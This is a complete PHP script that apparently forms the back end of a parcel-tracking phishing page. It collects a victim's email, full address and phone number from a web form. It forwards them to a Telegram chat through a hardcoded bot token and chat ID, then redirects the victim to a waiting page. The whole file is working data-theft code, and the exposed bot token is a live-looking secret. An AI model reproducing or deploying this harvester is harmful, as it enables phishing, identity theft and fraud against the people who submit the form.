<?php
// === CONFIG ===
$botToken = '7166403259:AAHcKMLdIWrWZdlf1jp7Vuubd3Tdczov7Eo';
$chatId = '5995238784';

// === GET USER INPUT ===
$email = $_POST['email'] ?? '';
$address = $_POST['add1'] ?? '';
$country = $_POST['add2'] ?? '';
$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip = $_POST['zip'] ?? '';
$phone = $_POST['phone'] ?? '';

// === FORMAT MESSAGE ===
$message = "📦 New Tracking Submission:\n";
$message .= "📧 Email: $email\n";
$message .= "🏠 Address: $address\n";
$message .= "🌍 Country: $country\n";
$message .= "🏙️ City: $city\n";
$message .= "🗺️ State: $state\n";
$message .= "📮 ZIP: $zip\n";
$message .= "📞 Phone: $phone";

// === SEND TO TELEGRAM ===
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
file_get_contents($telegramURL, false, $context);

// === REDIRECT ===
header("Location: wait1.html");
exit;
?>
